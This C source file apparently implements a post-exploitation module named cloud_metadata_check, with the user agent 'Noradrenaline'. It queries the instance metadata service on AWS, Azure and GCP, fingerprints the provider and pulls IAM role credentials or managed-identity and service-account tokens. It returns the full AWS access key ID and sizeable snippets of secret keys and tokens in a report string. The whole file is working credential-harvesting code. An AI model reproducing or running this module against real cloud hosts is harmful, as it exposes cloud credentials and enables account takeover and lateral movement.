#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <poll.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define EXPORT __attribute__((visibility("default")))

#define OUT_SIZE 8192
#define BODY_MAX 2048
#define AWS_TOKEN_MAX 512
#define CONTEXT_MAX 256
#define ROLE_MAX 128
#define SNIP_KEY_ID 24
#define SNIP_SECRET 32
#define SNIP_TOKEN 32
#ifndef IMDS_HOST
#define IMDS_HOST "169.254.169.254"
#endif
#ifndef IMDS_PORT
#define IMDS_PORT 80
#endif
#define HTTP_TIMEOUT_MS 1200

static char output[OUT_SIZE];

static int appendf(size_t *used, const char *fmt, ...) {
    if (*used >= sizeof(output)) {
        return 0;
    }

    va_list args;
    va_start(args, fmt);
    int written = vsnprintf(output + *used, sizeof(output) - *used, fmt, args);
    va_end(args);

    if (written < 0) {
        return 0;
    }
    if ((size_t)written >= sizeof(output) - *used) {
        *used = sizeof(output) - 1;
        output[*used] = '\0';
        return 0;
    }

    *used += (size_t)written;
    return 1;
}

static int str_equals_i(const char *a, const char *b) {
    if (a == NULL || b == NULL) {
        return 0;
    }
    while (*a != '\0' && *b != '\0') {
        unsigned char ca = (unsigned char)*a++;
        unsigned char cb = (unsigned char)*b++;
        if (tolower(ca) != tolower(cb)) {
            return 0;
        }
    }
    return *a == '\0' && *b == '\0';
}

static void trim_trailing_ws(char *s) {
    if (s == NULL) {
        return;
    }
    size_t n = strlen(s);
    while (n > 0 && (s[n - 1] == '\r' || s[n - 1] == '\n' || s[n - 1] == ' ' || s[n - 1] == '\t')) {
        s[--n] = '\0';
    }
}

static int connect_imds(int timeout_ms) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        return -1;
    }

    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) {
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(IMDS_PORT);
    if (inet_pton(AF_INET, IMDS_HOST, &addr.sin_addr) != 1) {
        close(fd);
        return -1;
    }

    int rc = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    if (rc != 0 && errno != EINPROGRESS) {
        close(fd);
        return -1;
    }

    struct pollfd pfd;
    memset(&pfd, 0, sizeof(pfd));
    pfd.fd = fd;
    pfd.events = POLLOUT;
    if (poll(&pfd, 1, timeout_ms) <= 0) {
        close(fd);
        return -1;
    }

    int err = 0;
    socklen_t err_len = sizeof(err);
    if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len) != 0 || err != 0) {
        close(fd);
        return -1;
    }

    if (flags >= 0) {
        fcntl(fd, F_SETFL, flags);
    }
    return fd;
}

static int probe_imds_tcp(void) {
    int fd = connect_imds(HTTP_TIMEOUT_MS);
    if (fd < 0) {
        return 0;
    }
    close(fd);
    return 1;
}

static int send_all(int fd, const char *buf, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        ssize_t n = send(fd, buf + sent, len - sent, 0);
        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            return 0;
        }
        if (n == 0) {
            return 0;
        }
        sent += (size_t)n;
    }
    return 1;
}

static int http_request(const char *method, const char *path, const char *headers,
                        char *body, size_t body_max, int *out_status) {
    char request[1536];
    char response[4096];
    size_t used = 0;
    int fd = -1;

    if (body != NULL && body_max > 0) {
        body[0] = '\0';
    }
    if (out_status != NULL) {
        *out_status = 0;
    }

    int request_len = snprintf(request, sizeof(request),
        "%s %s HTTP/1.1\r\n"
        "Host: " IMDS_HOST "\r\n"
        "User-Agent: Noradrenaline/cloud_metadata_check\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "%s"
        "\r\n",
        method, path, headers != NULL ? headers : "");
    if (request_len <= 0 || (size_t)request_len >= sizeof(request)) {
        return 0;
    }

    fd = connect_imds(HTTP_TIMEOUT_MS);
    if (fd < 0) {
        return 0;
    }

    if (!send_all(fd, request, (size_t)request_len)) {
        close(fd);
        return 0;
    }

    while (used < sizeof(response) - 1) {
        struct pollfd pfd;
        memset(&pfd, 0, sizeof(pfd));
        pfd.fd = fd;
        pfd.events = POLLIN;
        int pr = poll(&pfd, 1, HTTP_TIMEOUT_MS);
        if (pr <= 0) {
            break;
        }

        ssize_t n = recv(fd, response + used, sizeof(response) - 1 - used, 0);
        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            break;
        }
        if (n == 0) {
            break;
        }
        used += (size_t)n;
    }
    close(fd);

    response[used] = '\0';
    if (used == 0) {
        return 0;
    }

    int status = 0;
    if (sscanf(response, "HTTP/%*s %d", &status) != 1) {
        return 0;
    }
    if (out_status != NULL) {
        *out_status = status;
    }

    char *body_start = strstr(response, "\r\n\r\n");
    if (body_start != NULL && body != NULL && body_max > 0) {
        body_start += 4;
        size_t copy_len = strlen(body_start);
        if (copy_len > body_max - 1) {
            copy_len = body_max - 1;
        }
        memcpy(body, body_start, copy_len);
        body[copy_len] = '\0';
        trim_trailing_ws(body);
    }

    return 1;
}

static int http_status(const char *method, const char *path, const char *headers) {
    int status = 0;
    http_request(method, path, headers, NULL, 0, &status);
    return status;
}

static int http_read(const char *method, const char *path, const char *headers,
                     char *body, size_t body_max, int *out_status) {
    return http_request(method, path, headers, body, body_max, out_status);
}

static int aws_acquire_token(char *token_buf, size_t token_max) {
    int status = 0;
    if (token_buf == NULL || token_max < 2) {
        return 0;
    }

    token_buf[0] = '\0';
    if (!http_read("PUT", "/latest/api/token",
                   "X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n",
                   token_buf, token_max, &status)) {
        return 0;
    }
    trim_trailing_ws(token_buf);
    return status == 200 && token_buf[0] != '\0';
}

static void build_aws_token_header(char *header, size_t header_max, const char *token) {
    if (header == NULL || header_max == 0) {
        return;
    }
    header[0] = '\0';
    if (token != NULL && token[0] != '\0') {
        snprintf(header, header_max, "X-aws-ec2-metadata-token: %s\r\n", token);
    }
}

static int json_field_snip(const char *body, const char *key,
                           char *out, size_t out_max, size_t snip_max) {
    if (body == NULL || key == NULL || out == NULL || out_max < 2 || snip_max == 0) {
        return 0;
    }
    out[0] = '\0';

    char needle[96];
    int n = snprintf(needle, sizeof(needle), "\"%s\"", key);
    if (n <= 0 || (size_t)n >= sizeof(needle)) {
        return 0;
    }

    const char *p = strstr(body, needle);
    if (p == NULL) {
        return 0;
    }

    p += strlen(needle);
    while (*p != '\0' && isspace((unsigned char)*p)) {
        p++;
    }
    if (*p != ':') {
        return 0;
    }
    p++;
    while (*p != '\0' && isspace((unsigned char)*p)) {
        p++;
    }
    if (*p != '"') {
        return 0;
    }
    p++;

    size_t copied = 0;
    while (p[copied] != '\0' && p[copied] != '"' && copied < snip_max && copied < out_max - 1) {
        out[copied] = p[copied];
        copied++;
    }
    out[copied] = '\0';
    return copied > 0;
}

static void extract_first_line(const char *body, char *out, size_t out_max) {
    if (body == NULL || out == NULL || out_max < 2) {
        return;
    }
    size_t i = 0;
    while (body[i] != '\0' && body[i] != '\r' && body[i] != '\n' && i < out_max - 1) {
        out[i] = body[i];
        i++;
    }
    out[i] = '\0';
    trim_trailing_ws(out);
}

static void report_context_line(size_t *used, const char *label, const char *value) {
    if (value != NULL && value[0] != '\0') {
        appendf(used, "[i] %s: %s\n", label, value);
    }
}

static void aws_report_identity(size_t *used, const char *aws_token, int presence_only) {
    char body[BODY_MAX];
    char role[ROLE_MAX];
    char snip[SNIP_TOKEN + 8];
    char headers[AWS_TOKEN_MAX + 64];
    char cred_path[256];
    int status = 0;

    build_aws_token_header(headers, sizeof(headers), aws_token);

    memset(body, 0, sizeof(body));
    memset(role, 0, sizeof(role));
    if (!http_read("GET", "/latest/meta-data/iam/security-credentials/",
                   headers, body, sizeof(body), &status)
        || status != 200 || body[0] == '\0') {
        appendf(used, "[i] identity_available: no\n");
        return;
    }

    extract_first_line(body, role, sizeof(role));
    if (role[0] == '\0') {
        appendf(used, "[i] identity_available: no\n");
        return;
    }

    appendf(used, "[i] iam_role: %s\n", role);

    snprintf(cred_path, sizeof(cred_path), "/latest/meta-data/iam/security-credentials/%s", role);
    memset(body, 0, sizeof(body));
    status = 0;
    if (!http_read("GET", cred_path, headers, body, sizeof(body), &status)
        || status != 200 || body[0] == '\0') {
        appendf(used, "[i] identity_available: no\n");
        return;
    }

    int has_identity = json_field_snip(body, "AccessKeyId", snip, sizeof(snip), SNIP_KEY_ID)
        || json_field_snip(body, "SecretAccessKey", snip, sizeof(snip), 8);
    appendf(used, "[i] identity_available: %s\n", has_identity ? "yes" : "no");

    if (presence_only || !has_identity) {
        return;
    }

    memset(snip, 0, sizeof(snip));
    if (json_field_snip(body, "AccessKeyId", snip, sizeof(snip), SNIP_KEY_ID)) {
        appendf(used, "[i] access_key_id: %s\n", snip);
    }
    memset(snip, 0, sizeof(snip));
    if (json_field_snip(body, "SecretAccessKey", snip, sizeof(snip), SNIP_SECRET)) {
        appendf(used, "[i] secret_key_snip: %s\n", snip);
    }
    memset(snip, 0, sizeof(snip));
    if (json_field_snip(body, "Token", snip, sizeof(snip), SNIP_TOKEN)) {
        appendf(used, "[i] token_snip: %s\n", snip);
    }
}

static void aws_report_context(size_t *used, const char *aws_token) {
    char ctx[CONTEXT_MAX];
    char headers[AWS_TOKEN_MAX + 64];
    int status = 0;

    build_aws_token_header(headers, sizeof(headers), aws_token);

    memset(ctx, 0, sizeof(ctx));
    if (http_read("GET", "/latest/meta-data/instance-id", headers, ctx, sizeof(ctx), &status)
        && status == 200) {
        report_context_line(used, "instance_id", ctx);
    }

    memset(ctx, 0, sizeof(ctx));
    status = 0;
    if (http_read("GET", "/latest/meta-data/placement/region", headers, ctx, sizeof(ctx), &status)
        && status == 200) {
        report_context_line(used, "region", ctx);
    }
}

static void azure_report_identity(size_t *used, int presence_only) {
    char body[BODY_MAX];
    char snip[SNIP_TOKEN + 8];
    int status = 0;

    memset(body, 0, sizeof(body));
    if (!http_read("GET",
                   "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                   "Metadata: true\r\n", body, sizeof(body), &status)
        || status != 200) {
        appendf(used, "[i] identity_available: no\n");
        return;
    }

    appendf(used, "[i] identity_available: yes\n");
    if (presence_only) {
        return;
    }

    memset(snip, 0, sizeof(snip));
    if (json_field_snip(body, "access_token", snip, sizeof(snip), SNIP_TOKEN)) {
        appendf(used, "[i] managed_identity_snip: %s\n", snip);
    }
}

static void azure_report_context(size_t *used) {
    char ctx[CONTEXT_MAX];
    int status = 0;

    memset(ctx, 0, sizeof(ctx));
    if (http_read("GET", "/metadata/instance/compute/name?api-version=2021-02-01",
                  "Metadata: true\r\n", ctx, sizeof(ctx), &status)
        && status == 200) {
        report_context_line(used, "vm_name", ctx);
    }

    memset(ctx, 0, sizeof(ctx));
    status = 0;
    if (http_read("GET", "/metadata/instance/compute/location?api-version=2021-02-01",
                  "Metadata: true\r\n", ctx, sizeof(ctx), &status)
        && status == 200) {
        report_context_line(used, "location", ctx);
    }
}

static void gcp_report_identity(size_t *used, int presence_only) {
    char body[BODY_MAX];
    char snip[SNIP_TOKEN + 8];
    int status = 0;

    memset(body, 0, sizeof(body));
    if (http_read("GET", "/computeMetadata/v1/instance/service-accounts/default/email",
                  "Metadata-Flavor: Google\r\n", body, sizeof(body), &status)
        && status == 200 && body[0] != '\0') {
        appendf(used, "[i] service_account: %s\n", body);
    }

    memset(body, 0, sizeof(body));
    status = 0;
    if (!http_read("GET", "/computeMetadata/v1/instance/service-accounts/default/token",
                   "Metadata-Flavor: Google\r\n", body, sizeof(body), &status)
        || status != 200) {
        appendf(used, "[i] identity_available: no\n");
        return;
    }

    int has_token = body[0] != '\0';
    appendf(used, "[i] identity_available: %s\n", has_token ? "yes" : "no");
    if (presence_only || !has_token) {
        return;
    }

    memset(snip, 0, sizeof(snip));
    if (json_field_snip(body, "access_token", snip, sizeof(snip), SNIP_TOKEN)) {
        appendf(used, "[i] token_snip: %s\n", snip);
    } else {
        size_t copy_len = strlen(body);
        if (copy_len > SNIP_TOKEN) {
            copy_len = SNIP_TOKEN;
        }
        memcpy(snip, body, copy_len);
        snip[copy_len] = '\0';
        appendf(used, "[i] token_snip: %s\n", snip);
    }
}

static void gcp_report_context(size_t *used) {
    char ctx[CONTEXT_MAX];
    int status = 0;

    memset(ctx, 0, sizeof(ctx));
    if (http_read("GET", "/computeMetadata/v1/project/project-id",
                  "Metadata-Flavor: Google\r\n", ctx, sizeof(ctx), &status)
        && status == 200) {
        report_context_line(used, "project_id", ctx);
    }

    memset(ctx, 0, sizeof(ctx));
    status = 0;
    if (http_read("GET", "/computeMetadata/v1/instance/zone",
                  "Metadata-Flavor: Google\r\n", ctx, sizeof(ctx), &status)
        && status == 200) {
        report_context_line(used, "zone", ctx);
    }

    memset(ctx, 0, sizeof(ctx));
    status = 0;
    if (http_read("GET", "/computeMetadata/v1/instance/name",
                  "Metadata-Flavor: Google\r\n", ctx, sizeof(ctx), &status)
        && status == 200) {
        report_context_line(used, "instance_name", ctx);
    }
}

EXPORT char *cloud_metadata_check(int argc, char **argv) {
    char aws_token[AWS_TOKEN_MAX];
    size_t used = 0;
    int presence_only = 0;

    output[0] = '\0';
    memset(aws_token, 0, sizeof(aws_token));

    if (argc > 1 && argv != NULL && argv[1] != NULL && str_equals_i(argv[1], "presence")) {
        presence_only = 1;
    }

    appendf(&used, "[+] cloud_metadata_check started\n");

    int reachable = probe_imds_tcp();
    appendf(&used, "[i] imds_reachable: %s\n", reachable ? "yes" : "no");
    if (!reachable) {
        appendf(&used, "[+] cloud_metadata_check complete\n");
        return output;
    }

    int aws_status = http_status("GET", "/latest/meta-data/", NULL);
    int is_aws = 0;
    int aws_imds_mode = 0;
    if (aws_status == 200) {
        is_aws = 1;
        aws_imds_mode = 1;
    } else if (aws_status == 401 && aws_acquire_token(aws_token, sizeof(aws_token))) {
        char headers[AWS_TOKEN_MAX + 64];
        build_aws_token_header(headers, sizeof(headers), aws_token);
        aws_status = http_status("GET", "/latest/meta-data/", headers);
        if (aws_status == 200) {
            is_aws = 1;
            aws_imds_mode = 2;
        }
    }

    int azure_status = http_status("GET", "/metadata/instance?api-version=2021-02-01",
                                   "Metadata: true\r\n");
    int gcp_status = http_status("GET", "/computeMetadata/v1/",
                                 "Metadata-Flavor: Google\r\n");
    int is_azure = azure_status == 200;
    int is_gcp = gcp_status == 200;

    if (is_aws) {
        appendf(&used, "[i] provider: aws\n");
        appendf(&used, "[i] imds_mode: %s\n", aws_imds_mode == 2 ? "v2" : "v1");
        aws_report_identity(&used, aws_imds_mode == 2 ? aws_token : NULL, presence_only);
        aws_report_context(&used, aws_imds_mode == 2 ? aws_token : NULL);
    } else if (is_azure) {
        appendf(&used, "[i] provider: azure\n");
        azure_report_identity(&used, presence_only);
        azure_report_context(&used);
    } else if (is_gcp) {
        appendf(&used, "[i] provider: gcp\n");
        gcp_report_identity(&used, presence_only);
        gcp_report_context(&used);
    } else {
        appendf(&used, "[i] provider: unknown\n");
        appendf(&used, "[i] probe_status: aws=%d azure=%d gcp=%d\n",
                aws_status, azure_status, gcp_status);
    }

    appendf(&used, "[+] cloud_metadata_check complete\n");
    return output;
}
